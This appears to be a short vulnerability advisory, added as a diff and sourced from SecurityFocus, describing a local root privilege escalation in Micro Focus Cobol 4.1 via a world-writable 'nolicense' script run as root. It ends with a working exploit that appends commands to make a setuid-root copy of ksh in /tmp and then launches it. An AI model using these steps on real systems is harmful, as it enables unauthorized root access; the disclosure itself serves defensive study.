@@ -1,0 +1,18 @@
+source: http://www.securityfocus.com/bid/2359/info
+
+Micro Focus Cobol is a development suite for unix platforms offered by Merant. It is typically licensed on a per-user basis.
+
+If Micro Focus Cobol is installed with the 'Apptrack' feature enabled, local users may be able to elevate privileges. A shell script called 'nolicense' that is executed as root is installed with insecure file permissions.
+
+As a result, attackers may be able to execute arbitrary commands as root if the script is modified.
+
+This is known to affect version 4.1. Though unverified, previous versions of Micro Focus Cobol may also be vulnerable. 
+
+$ cat >> /var/mfaslmf/nolicense
+/bin/cp /bin/ksh /tmp; chmod 4755 /tmp/ksh
+^D
+
+[wait until the application server licenses are used up]
+
+$ /tmp/ksh
+# 
